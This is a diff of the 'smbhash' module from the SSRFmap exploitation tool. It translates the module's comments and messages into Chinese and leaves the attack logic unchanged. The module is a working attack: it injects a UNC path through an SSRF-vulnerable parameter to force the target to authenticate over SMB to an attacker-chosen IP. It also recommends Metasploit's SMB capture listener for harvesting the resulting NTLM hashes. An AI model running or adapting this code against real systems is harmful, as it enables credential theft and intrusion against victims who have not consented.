@@ -2,11 +2,11 @@ import logging
 
 from core.utils import *
 
-# NOTE
-# Use auxiliary/server/capture/smb from Metasploit to setup a listener
+# 注意
+# 使用 Metasploit 的 auxiliary/server/capture/smb 模块搭建监听器
 
 name = "smbhash"
-description = "Force an SMB authentication attempt by embedding a UNC path (\\\\SERVER\\SHARE) "
+description = "通过嵌入 UNC 路径（\\\\SERVER\\SHARE）强制触发一次 SMB 认证"
 author = "Swissky"
 documentation = []
 
@@ -17,16 +17,16 @@ class exploit:
     UNC_FILE = "SSRFmap"
 
     def __init__(self, requester, args):
-        logging.info(f"Module '{name}' launched !")
+        logging.info(f"模块 '{name}' 已启动！")
 
-        UNC_IP = input("UNC IP (default: 192.168.1.2): ")
+        UNC_IP = input("UNC IP（默认 192.168.1.2）: ")
         if UNC_IP != "":
             self.UNC_IP = UNC_IP
 
-        UNC_FILE = input("UNC File (default: SSRFmap): ")
+        UNC_FILE = input("UNC 文件名（默认 SSRFmap）: ")
         if UNC_FILE != "":
             self.UNC_FILE = UNC_FILE
 
         payload = wrapper_unc(self.UNC_FILE, self.UNC_IP)
         r = requester.do_request(args.param, payload)
-        logging.info(f"\033[32mSending UNC Path\033[0m : {payload}")
+        logging.info(f"\033[32m发送 UNC 路径\033[0m : {payload}")
